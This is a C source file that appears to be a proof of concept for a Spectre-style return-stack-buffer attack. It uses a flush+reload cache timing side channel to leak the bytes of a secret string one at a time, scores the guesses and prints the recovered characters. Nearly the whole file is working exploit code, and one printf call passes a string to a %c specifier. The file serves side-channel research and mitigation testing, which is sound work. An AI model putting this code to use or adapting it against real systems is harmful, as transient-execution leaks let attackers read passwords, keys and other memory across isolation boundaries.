#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"
#include "../defines.h"
#include "rsb.h"

char* oracle_block;

// ! TODO: try void returns?


void readMemoryByte(char sec, uint8_t value[2], int score[2]){
  static int results[256];
  static int tries, i, j, k, mix_i;
  size_t training_x, x;

  for (i = 0; i < 256; i++){
    results[i] = 0;
  }
  for (tries = TRIES; tries > 0; tries--) {

    flush(oracle_block, PAGESIZE);


    _mm_mfence();
    call_start(sec);
    _mm_mfence();
    probe(oracle_block,CACHE_MISS, PAGESIZE, results);

    
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

  }
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  char* secret = SECRET;
  size_t len = sizeof(SECRET) - 1;

  char cc;

  oracle_block = malloc(256 * PAGESIZE);
  memset(oracle_block, 1, 256*PAGESIZE);
  flush(oracle_block, PAGESIZE);
  int score[2];
  uint8_t value[2];
  


  _mm_mfence();
  
  for (int i = 0; i < len; i++) {
    cc = secret[i]; // precomputation of character to extract
    printf("Attempting to read %c... ", cc);
    readMemoryByte(cc, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  free(oracle_block);

  return (0);
}
